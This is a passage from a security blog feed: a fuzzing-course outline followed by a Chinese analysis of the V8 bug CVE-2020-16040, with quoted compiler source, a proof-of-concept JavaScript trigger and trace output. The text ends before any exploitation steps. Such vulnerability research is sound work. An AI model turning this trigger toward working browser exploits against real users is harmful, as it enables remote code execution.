title="目录:"></a>目录:</h2><p>每月一个专题，持续更新，按专题购买</p><h3 id="专题1-Fuzz基础"><a href="#专题1-Fuzz基础" class="headerlink" title="专题1: Fuzz基础"></a>专题1: Fuzz基础</h3><h4 id="week1"><a href="#week1" class="headerlink" title="week1"></a>week1</h4><ol><li>AFL原理分析与源码调试, 修改技巧</li><li>我的fuzz学习之路</li></ol><h4 id="week2-AFL的使用方法和AFL学习答疑"><a href="#week2-AFL的使用方法和AFL学习答疑" class="headerlink" title="week2: AFL的使用方法和AFL学习答疑"></a>week2: AFL的使用方法和AFL学习答疑</h4><ol><li>AFL的使用</li><li>Fuzz101练习</li></ol><h4 id="week3-structure-aware-fuzz结构化输入"><a href="#week3-structure-aware-fuzz结构化输入" class="headerlink" title="week3: structure aware fuzz结构化输入"></a>week3: structure aware fuzz结构化输入</h4><ol><li>libfuzzer使用</li><li>通过libprotobuf-mutator实现结构感知fuzz，从而对高度结构化的数据输入进行fuzz（例如解ctf菜单堆题，亦或者fuzz网络协议）与AFL学习答疑。</li></ol><h4 id="week4-AFL-libprotobuf-mutator"><a href="#week4-AFL-libprotobuf-mutator" class="headerlink" title="week4: AFL+libprotobuf-mutator"></a>week4: AFL+libprotobuf-mutator</h4><ol><li>如何魔改AFL来实现结构感知fuzz</li><li>CTF菜单堆题Fuzz实例学习。</li></ol><h3 id="专题2-浏览器fuzz-1目录"><a href="#专题2-浏览器fuzz-1目录" class="headerlink" title="专题2: 浏览器fuzz-1目录"></a>专题2: 浏览器fuzz-1目录</h3><h4 id="week1-1"><a href="#week1-1" class="headerlink" title="week1"></a>week1</h4><ol><li>浏览器安全研究和fuzz需要掌握的基础介绍</li><li>历史攻击面总结，怎么找到好的历史漏洞调试学习</li><li>怎么找到新漏洞的补丁学习模式来挖掘新的漏洞</li><li>分享总结各类好的浏览器fuzz项目</li><li>我对浏览器漏洞挖掘的一些建议吧</li></ol><h4 id="week2"><a href="#week2" class="headerlink" title="week2"></a>week2</h4><ol><li>如何修改单元测试或libfuzzer来十分钟完成一个Chrome浏览器fuzz</li><li>如何修改并使用精准覆盖率统计来评估你的fuzz效果</li><li>anti oss-fuzz，一个有趣的0day漏洞攻击面</li></ol><h4 id="week3"><a href="#week3" class="headerlink" title="week3"></a>week3</h4><ol><li>浏览器文法fuzz-IR部分</li><li>fuzzilli源码分析与调试(上)</li></ol><h4 id="week4"><a href="#week4" class="headerlink" title="week4"></a>week4</h4><ol><li>fuzzilli源码分析与调试(下)</li><li>我是如何修改fuzzilli挖掘到我的第一个v8漏洞的</li><li>回顾: fuzzilli的优点与不足，IR fuzz的适用场景</li></ol>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;sakuraのfuzzing-lab培训&quot;&gt;&lt;a href=&quot;#sakuraのfuzzing-lab培训&quot; class=&quot;headerlink&quot; title=&quot;sakuraのfuzzing lab培训&quot;&gt;&lt;/a&gt;sakuraのfuzzing lab培训&lt;/h2&gt;&lt;
      
    
    </summary>
    
    
      <category term="学习日记" scheme="http://eternalsakura13.com/categories/%E5%AD%A6%E4%B9%A0%E6%97%A5%E8%AE%B0/"/>
    
    
      <category term="sakuraのsakura" scheme="http://eternalsakura13.com/tags/sakura%E3%81%AEsakura/"/>
    
  </entry>
  
  <entry>
    <title>chrome exploitation解读:CVE-2020-16040漏洞分析与利用</title>
    <link href="http://eternalsakura13.com/2021/06/22/cve-2020-16040/"/>
    <id>http://eternalsakura13.com/2021/06/22/cve-2020-16040/</id>
    <published>2021-06-22T03:39:03.062Z</published>
    <updated>2021-06-22T03:39:03.062Z</updated>
    
    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>本篇主要是对zer0con2021上chrome exploitation议题v8部分的解读。</p><p>这个漏洞发生在Simplified Lowering phase的VisitSpeculativeIntegerAdditiveOp函数中，该函数是用来处理SpeculativeSafeIntegerAdd/SpeculativeSafeIntegerSubtract节点，对其重新计算类型并将其转化或者降级到更底层的IR。<br>这个函数非常有趣，据我所知它已经出了三个可以RCE的漏洞了</p><h2 id="Simplified-lowing-phase和Root-Cause"><a href="#Simplified-lowing-phase和Root-Cause" class="headerlink" title="Simplified lowing phase和Root Cause"></a>Simplified lowing phase和Root Cause</h2><ul><li>反向数据流分析，传播truncation，并设置restriction_type</li><li>正向数据流分析，重新计算类型，并设置representation。</li><li>降级(lower)节点或者插入转换(conversion)节点</li></ul><h3 id="重要的数据结构和函数"><a href="#重要的数据结构和函数" class="headerlink" title="重要的数据结构和函数"></a>重要的数据结构和函数</h3><ul><li>NodeInfo，记录数据流分析中节点的各种类型信息，主要包括truncation(指明该节点在使用的时候的截断信息)，restriction_type(在truncation传播阶段设置它的值，用于在retype的时候设置feedback_type)，feedback_type（用于在Retype phase重新计算type信息），representation（节点retype完成之后最终的表示类型，可以用于指明应该如何lower到更具体的节点，是否需要Convert）等。</li></ul><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Information for each node tracked during the fixpoint.</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">NodeInfo</span> <span class="title">final</span> &#123;</span></span><br><span class="line"> <span class="keyword">public</span>:</span><br><span class="line">  <span class="comment">// Adds new use to the node. Returns true if something has changed</span></span><br><span class="line">  <span class="comment">// and the node has to be requeued.</span></span><br><span class="line">  <span class="function"><span class="keyword">bool</span> <span class="title">AddUse</span><span class="params">(UseInfo info)</span> </span>&#123;</span><br><span class="line">    Truncation old_truncation = truncation_;</span><br><span class="line">    truncation_ = Truncation::Generalize(truncation_, info.truncation());</span><br><span class="line">    <span class="keyword">return</span> truncation_ != old_truncation;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="keyword">void</span> <span class="title">set_queued</span><span class="params">()</span> </span>&#123; state_ = kQueued; &#125;</span><br><span class="line">  <span class="function"><span class="keyword">void</span> <span class="title">set_visited</span><span class="params">()</span> </span>&#123; state_ = kVisited; &#125;</span><br><span class="line">  <span class="function"><span class="keyword">void</span> <span class="title">set_pushed</span><span class="params">()</span> </span>&#123; state_ = kPushed; &#125;</span><br><span class="line">  <span class="function"><span class="keyword">void</span> <span class="title">reset_state</span><span class="params">()</span> </span>&#123; state_ = kUnvisited; &#125;</span><br><span class="line">  <span class="function"><span class="keyword">bool</span> <span class="title">visited</span><span class="params">()</span> <span class="keyword">const</span> </span>&#123; <span class="keyword">return</span> state_ == kVisited; &#125;</span><br><span class="line">  <span class="function"><span class="keyword">bool</span> <span class="title">queued</span><span class="params">()</span> <span class="keyword">const</span> </span>&#123; <span class="keyword">return</span> state_ == kQueued; &#125;</span><br><span class="line">  <span class="function"><span class="keyword">bool</span> <span class="title">pushed</span><span class="params">()</span> <span class="keyword">const</span> </span>&#123; <span class="keyword">return</span> state_ == kPushed; &#125;</span><br><span class="line">  <span class="function"><span class="keyword">bool</span> <span class="title">unvisited</span><span class="params">()</span> <span class="keyword">const</span> </span>&#123; <span class="keyword">return</span> state_ == kUnvisited; &#125;</span><br><span class="line">  <span class="function">Truncation <span class="title">truncation</span><span class="params">()</span> <span class="keyword">const</span> </span>&#123; <span class="keyword">return</span> truncation_; &#125;</span><br><span class="line">  <span class="function"><span class="keyword">void</span> <span class="title">set_output</span><span class="params">(MachineRepresentation output)</span> </span>&#123; representation_ = output; &#125;</span><br><span class="line"></span><br><span class="line">  <span class="function">MachineRepresentation <span class="title">representation</span><span class="params">()</span> <span class="keyword">const</span> </span>&#123; <span class="keyword">return</span> representation_; &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// Helpers for feedback typing.</span></span><br><span class="line">  <span class="function"><span class="keyword">void</span> <span class="title">set_feedback_type</span><span class="params">(Type type)</span> </span>&#123; feedback_type_ = type; &#125;</span><br><span class="line">  <span class="function">Type <span class="title">feedback_type</span><span class="params">()</span> <span class="keyword">const</span> </span>&#123; <span class="keyword">return</span> feedback_type_; &#125;</span><br><span class="line">  <span class="function"><span class="keyword">void</span> <span class="title">set_weakened</span><span class="params">()</span> </span>&#123; weakened_ = <span class="literal">true</span>; &#125;</span><br><span class="line">  <span class="function"><span class="keyword">bool</span> <span class="title">weakened</span><span class="params">()</span> <span class="keyword">const</span> </span>&#123; <span class="keyword">return</span> weakened_; &#125;</span><br><span class="line">  <span class="function"><span class="keyword">void</span> <span class="title">set_restriction_type</span><span class="params">(Type type)</span> </span>&#123; restriction_type_ = type; &#125;</span><br><span class="line">  <span class="function">Type <span class="title">restriction_type</span><span class="params">()</span> <span class="keyword">const</span> </span>&#123; <span class="keyword">return</span> restriction_type_; &#125;</span><br><span class="line"></span><br><span class="line"> <span class="keyword">private</span>:</span><br><span class="line">  <span class="keyword">enum</span> State : <span class="keyword">uint8_t</span> &#123; kUnvisited, kPushed, kVisited, kQueued &#125;;</span><br><span class="line">  State state_ = kUnvisited;</span><br><span class="line">  MachineRepresentation representation_ =</span><br><span class="line">      MachineRepresentation::kNone;             <span class="comment">// Output representation.</span></span><br><span class="line">  Truncation truncation_ = Truncation::None();  <span class="comment">// Information about uses.</span></span><br><span class="line"></span><br><span class="line">  Type restriction_type_ = Type::Any();</span><br><span class="line">  Type feedback_type_;</span><br><span class="line">  <span class="keyword">bool</span> weakened_ = <span class="literal">false</span>;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><ul><li>ProcessInput<br>这是一个模板函数，根据不同的phase调用不同的实现，对于truncation propagate phase，它将直接调用EnqueueInput。<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">template</span> &lt;&gt;</span><br><span class="line"><span class="keyword">void</span> RepresentationSelector::ProcessInput&lt;PROPAGATE&gt;(Node* node, <span class="keyword">int</span> index,</span><br><span class="line">                                                     UseInfo use) &#123;</span><br><span class="line">  DCHECK_IMPLIES(use.type_check() != TypeCheckKind::kNone,</span><br><span class="line">                 !node-&gt;op()-&gt;HasProperty(Operator::kNoDeopt) &amp;&amp;</span><br><span class="line">                     node-&gt;op()-&gt;EffectInputCount() &gt; <span class="number">0</span>);</span><br><span class="line">  EnqueueInput&lt;PROPAGATE&gt;(node, index, use);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">template</span> &lt;&gt;</span><br><span class="line"><span class="keyword">void</span> RepresentationSelector::ProcessInput&lt;RETYPE&gt;(Node* node, <span class="keyword">int</span> index,</span><br><span class="line">                                                  UseInfo use) &#123;</span><br><span class="line">  DCHECK_IMPLIES(use.type_check() != TypeCheckKind::kNone,</span><br><span class="line">                 !node-&gt;op()-&gt;HasProperty(Operator::kNoDeopt) &amp;&amp;</span><br><span class="line">                     node-&gt;op()-&gt;EffectInputCount() &gt; <span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">template</span> &lt;&gt;</span><br><span class="line"><span class="keyword">void</span> RepresentationSelector::ProcessInput&lt;LOWER&gt;(Node* node, <span class="keyword">int</span> index,</span><br><span class="line">                                                 UseInfo use) &#123;</span><br><span class="line">  DCHECK_IMPLIES(use.type_check() != TypeCheckKind::kNone,</span><br><span class="line">                 !node-&gt;op()-&gt;HasProperty(Operator::kNoDeopt) &amp;&amp;</span><br><span class="line">                     node-&gt;op()-&gt;EffectInputCount() &gt; <span class="number">0</span>);</span><br><span class="line">  ConvertInput(node, index, use);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">...</span><br><span class="line"> <span class="comment">// Converts input &#123;index&#125; of &#123;node&#125; according to given UseInfo &#123;use&#125;,</span></span><br><span class="line">  <span class="comment">// assuming the type of the input is &#123;input_type&#125;. If &#123;input_type&#125; is null,</span></span><br><span class="line">  <span class="comment">// it takes the input from the input node &#123;TypeOf(node-&gt;InputAt(index))&#125;.</span></span><br><span class="line">  <span class="function"><span class="keyword">void</span> <span class="title">ConvertInput</span><span class="params">(Node* node, <span class="keyword">int</span> index, UseInfo use,</span></span></span><br><span class="line"><span class="function"><span class="params">                    Type input_type = Type::Invalid())</span> </span>&#123;</span><br><span class="line">    <span class="comment">// In the change phase, insert a change before the use if necessary.</span></span><br><span class="line">    <span class="keyword">if</span> (use.representation() == MachineRepresentation::kNone)</span><br><span class="line">      <span class="keyword">return</span>;  <span class="comment">// No input requirement on the use.</span></span><br><span class="line">    Node* input = node-&gt;InputAt(index);</span><br><span class="line">    DCHECK_NOT_NULL(input);</span><br><span class="line">    NodeInfo* input_info = GetInfo(input);</span><br><span class="line">    MachineRepresentation input_rep = input_info-&gt;representation();</span><br><span class="line">    <span class="keyword">if</span> (input_rep != use.representation() ||</span><br><span class="line">        use.type_check() != TypeCheckKind::kNone) &#123;</span><br><span class="line">      <span class="comment">// Output representation doesn't match usage.</span></span><br><span class="line">      TRACE(<span class="string">"  change: #%d:%s(@%d #%d:%s) "</span>, node-&gt;id(), node-&gt;op()-&gt;mnemonic(),</span><br><span class="line">            index, input-&gt;id(), input-&gt;op()-&gt;mnemonic());</span><br><span class="line">      TRACE(<span class="string">"from %s to %s:%s\n"</span>,</span><br><span class="line">            MachineReprToString(input_info-&gt;representation()),</span><br><span class="line">            MachineReprToString(use.representation()),</span><br><span class="line">            use.truncation().description());</span><br><span class="line">      <span class="keyword">if</span> (input_type.IsInvalid()) &#123;</span><br><span class="line">        input_type = TypeOf(input);</span><br><span class="line">      &#125;</span><br><span class="line">      Node* n = changer_-&gt;GetRepresentationFor(input, input_rep, input_type,</span><br><span class="line">                                               node, use);</span><br><span class="line">      node-&gt;ReplaceInput(index, n);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure></li><li>EnqueueInput<br>这个函数先从全局数组里取出node的指定index的输入节点对应的NodeInfo信息，然后调用AddUse来更新info的<code>truncation_</code>字段，从而将truncation反向传播。<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Enqueue &#123;use_node&#125;'s &#123;index&#125; input if the &#123;use_info&#125; contains new information</span></span><br><span class="line"><span class="comment">// for that input node.</span></span><br><span class="line"><span class="keyword">template</span> &lt;&gt;</span><br><span class="line"><span class="keyword">void</span> RepresentationSelector::EnqueueInput&lt;PROPAGATE&gt;(Node* use_node, <span class="keyword">int</span> index,</span><br><span class="line">                                                     UseInfo use_info) &#123;</span><br><span class="line">  Node* node = use_node-&gt;InputAt(index);</span><br><span class="line">  NodeInfo* info = GetInfo(node);</span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> DEBUG</span></span><br><span class="line">  <span class="comment">// Check monotonicity of input requirements.</span></span><br><span class="line">  node_input_use_infos_[use_node-&gt;id()].SetAndCheckInput(use_node, index,</span><br><span class="line">                                                         use_info);</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span>  <span class="comment">// DEBUG</span></span></span><br><span class="line">  <span class="keyword">if</span> (info-&gt;unvisited()) &#123;</span><br><span class="line">    info-&gt;AddUse(use_info);</span><br><span class="line">    TRACE(<span class="string">"  initial #%i: %s\n"</span>, node-&gt;id(), info-&gt;truncation().description());</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  TRACE(<span class="string">"   queue #%i?: %s\n"</span>, node-&gt;id(), info-&gt;truncation().description());</span><br><span class="line">  <span class="keyword">if</span> (info-&gt;AddUse(use_info)) &#123;</span><br><span class="line">    <span class="comment">// New usage information for the node is available.</span></span><br><span class="line">    <span class="keyword">if</span> (!info-&gt;queued()) &#123;</span><br><span class="line">      DCHECK(info-&gt;visited());</span><br><span class="line">      revisit_queue_.push(node);</span><br><span class="line">      info-&gt;set_queued();</span><br><span class="line">      TRACE(<span class="string">"   added: %s\n"</span>, info-&gt;truncation().description());</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">      TRACE(<span class="string">" inqueue: %s\n"</span>, info-&gt;truncation().description());</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line">    <span class="function"><span class="keyword">bool</span> <span class="title">AddUse</span><span class="params">(UseInfo info)</span> </span>&#123;</span><br><span class="line">      Truncation old_truncation = truncation_;</span><br><span class="line">      truncation_ = Truncation::Generalize(truncation_, info.truncation());</span><br><span class="line">      <span class="keyword">return</span> truncation_ != old_truncation;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure></li><li>SetOutput<br>这个函数也是模板函数，根据不同phase调用不同的偏特化实现<ul><li>对于truncation propagate phase，它将更新节点对应的nodeinfo的<code>restriction_type_</code>，并用于后续的retype phase上。</li><li>对于retype phase，它将更新节点的representation表示。<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">template</span> &lt;&gt;</span><br><span class="line"><span class="keyword">void</span> RepresentationSelector::SetOutput&lt;PROPAGATE&gt;(</span><br><span class="line">    Node* node, MachineRepresentation representation, Type restriction_type) &#123;</span><br><span class="line">  NodeInfo* <span class="keyword">const</span> info = GetInfo(node);</span><br><span class="line">  info-&gt;set_restriction_type(restriction_type);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">template</span> &lt;&gt;</span><br><span class="line"><span class="keyword">void</span> RepresentationSelector::SetOutput&lt;RETYPE&gt;(</span><br><span class="line">    Node* node, MachineRepresentation representation, Type restriction_type) &#123;</span><br><span class="line">  NodeInfo* <span class="keyword">const</span> info = GetInfo(node);</span><br><span class="line">  DCHECK(restriction_type.Is(info-&gt;restriction_type()));</span><br><span class="line">  info-&gt;set_output(representation);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">template</span> &lt;&gt;</span><br><span class="line"><span class="keyword">void</span> RepresentationSelector::SetOutput&lt;LOWER&gt;(</span><br><span class="line">    Node* node, MachineRepresentation representation, Type restriction_type) &#123;</span><br><span class="line">  NodeInfo* <span class="keyword">const</span> info = GetInfo(node);</span><br><span class="line">  DCHECK_EQ(info-&gt;representation(), representation);</span><br><span class="line">  DCHECK(restriction_type.Is(info-&gt;restriction_type()));</span><br><span class="line">  USE(info);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ul></li></ul><h3 id="PoC"><a href="#PoC" class="headerlink" title="PoC"></a>PoC</h3><ul><li>Issue<br><a href="https://bugs.chromium.org/p/chromium/issues/detail?id=1150649" target="_blank" rel="noopener">https://bugs.chromium.org/p/chromium/issues/detail?id=1150649</a><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// test/mjsunit/compiler/regress-1150649.js </span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">foo</span>(<span class="params">a</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> y = <span class="number">0x7fffffff</span>;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> (a == <span class="literal">NaN</span>) y = <span class="literal">NaN</span>;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> (a) y = <span class="number">-1</span>;</span><br><span class="line">    <span class="keyword">const</span> z = (y + <span class="number">1</span>)|<span class="number">0</span>;</span><br><span class="line">    <span class="keyword">return</span> z &lt; <span class="number">0</span>; </span><br><span class="line">&#125;</span><br><span class="line">%PrepareFunctionForOptimization(foo); </span><br><span class="line">assertFalse(foo(<span class="literal">true</span>)); </span><br><span class="line">%OptimizeFunctionOnNextCall(foo); </span><br><span class="line">assertTrue(foo(<span class="literal">false</span>)); <span class="comment">// return False, FAILURE!!!</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">foo</span>(<span class="params">a</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">var</span> y = <span class="number">0x7fffffff</span>; <span class="comment">// 2^31 - 1</span></span><br><span class="line">  <span class="keyword">if</span> (a == <span class="literal">NaN</span>) y = <span class="literal">NaN</span>; <span class="comment">// Widen the static type of y (this condition never holds).</span></span><br><span class="line">  <span class="keyword">if</span> (a) y = <span class="number">-1</span>;<span class="comment">// The next condition holds only in the warmup run. It leads to Smi (SignedSmall) feedback being collected for the addition below. </span></span><br><span class="line">  <span class="keyword">let</span> z = (y + <span class="number">1</span>) | <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">return</span> z &lt; <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line">%PrepareFunctionForOptimization(foo);</span><br><span class="line">foo(<span class="literal">true</span>);</span><br><span class="line">%OptimizeFunctionOnNextCall(foo);</span><br><span class="line">print(foo(<span class="literal">false</span>));</span><br></pre></td></tr></table></figure>经过Typer phase之后:<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">y:</span><br><span class="line">(NaN | Range(-1, 0x7fffffff))</span><br><span class="line">y + 1:</span><br><span class="line">Range(0, 0x80000000)</span><br><span class="line">(y + 1) | 0:</span><br><span class="line">Range(-0x80000000, 0x7fffffff)</span><br></pre></td></tr></table></figure>若是正常的解释执行，则<code>const z = (y + 1)|0;</code>将计算出-0x80000000，其小于0显然为true，但在有漏洞的情况下却返回false。</li></ul><h3 id="truncation-propagation"><a href="#truncation-propagation" class="headerlink" title="truncation propagation"></a>truncation propagation</h3><p>通过<code>./d8 --allow-natives-syntax --trace-representation poc.js</code>可以完整的trace这三个阶段。</p><p>首先对于truncation propagation，可以看出在反向遍历节点的时候，在visit NumberLessThan的时候，将其输入节点#47的truncation由<code>TruncationKind::kNone(no-value-use)</code>更新到<code>TruncationKind::kWord32(truncate-to-word32)</code>，代表它在使用的时候会被截断到word32。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">visit #57: NumberLessThan (trunc: no-truncation (but distinguish zeros))</span><br><span class="line">  queue #47?: no-value-use</span><br><span class="line">inqueue: truncate-to-word32</span><br></pre></td></tr></table></figure><p><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2021-04-30-071031.png" alt=""></p><p>在处理<code>y+1</code>的时候,最终会调用到<code>VisitBinop</code>，其将左值和右值输入节点启发式的传播其truncation信息，并将SpeculativeSafeIntegerAdd对应的nodeinfo里的<code>restriction_type</code>字段更新到<code>Type::Signed32</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">visit #45: SpeculativeSafeIntegerAdd (trunc: truncate-to-word32)</span><br><span class="line"> initial #41: no-truncation (but identify zeros)</span><br><span class="line"> initial #44: no-truncation (but identify zeros)</span><br></pre></td></tr></table></figure><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">VisitSpeculativeIntegerAdditiveOp</span><span class="params">(Node* node, Truncation truncation,SimplifiedLowering* lowering)</span> </span>&#123;</span><br><span class="line">    ...</span><br><span class="line">    VisitBinop(..., Type::Signed32());</span><br><span class="line">    ...</span><br></pre></td></tr></table></figure><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">VisitBinop</span><span class="params">(Node* node, UseInfo left_use, UseInfo right_use, MachineRepresentation output, Type restriction_type = Type::Any())</span> </span>&#123;</span><br><span class="line">   DCHECK_EQ(<span class="number">2</span>, node-&gt;op()-&gt;ValueInputCount());</span><br><span class="line">   ProcessInput&lt;T&gt;(node, <span class="number">0</span>, left_use);</span><br><span class="line">   ProcessInput&lt;T&gt;(node, <span class="number">1</span>, right_use);</span><br><span class="line">   <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">2</span>; i &lt; node-&gt;InputCount(); i++) &#123;</span><br><span class="line">     EnqueueInput&lt;T&gt;(node, i);</span><br><span class="line">   &#125;</span><br><span class="line">   SetOutput&lt;T&gt;(node, output, restriction_type);</span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure><h3 id="Retype-phase"><a href="#Retype-phase" class="headerlink" title="Retype phase"></a>Retype phase</h3><p>Retype phase进行正向数据流分析，从Start节点开始，对每个节点UpdateFeedbackType更新类型，并将更新后的类型向前传播。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">#45:SpeculativeSafeIntegerAdd[SignedSmall](#41:Phi, #44:NumberConstant, #42:Checkpoint, #38:Merge)  </span><br><span class="line">[Static type: Range(0, 2147483648), </span><br><span class="line">Feedback type: Range(0, 2147483647)]</span><br><span class="line"> visit #45: SpeculativeSafeIntegerAdd</span><br><span class="line">  &#x3D;&#x3D;&gt; output kRepWord32</span><br></pre></td></tr></table></figure><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span 